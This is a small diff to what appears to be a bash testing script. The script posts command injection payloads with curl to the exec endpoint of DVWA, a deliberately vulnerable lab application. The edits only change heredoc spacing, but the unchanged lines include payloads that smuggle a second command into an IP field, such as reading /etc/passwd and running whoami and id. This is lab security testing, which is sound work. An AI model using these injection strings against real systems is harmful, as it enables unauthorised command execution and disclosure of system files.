@@ -18,7 +18,7 @@ echo ""
 echo "[+] Sending command injection payloads via curl..."
 
 # Payloads stored in a heredoc array to send against DVWA exec endpoint
-read -r -d '' PAYLOAD_LIST << 'PAYLOAD_EOF' || true
+read -r -d '' PAYLOAD_LIST <<'PAYLOAD_EOF' || true
 127.0.0.1; cat /etc/passwd
 127.0.0.1; whoami
 127.0.0.1; id
@@ -51,7 +51,7 @@ while IFS= read -r payload; do
     -d "ip=${encoded}&Submit=Submit" \
     --max-time 10) || code="ERR"
   echo "    dvwa/exec (POST) -> HTTP ${code}"
-done <<< "$PAYLOAD_LIST"
+done <<<"$PAYLOAD_LIST"
 
 echo ""
 echo "[*] Command Injection suite complete"
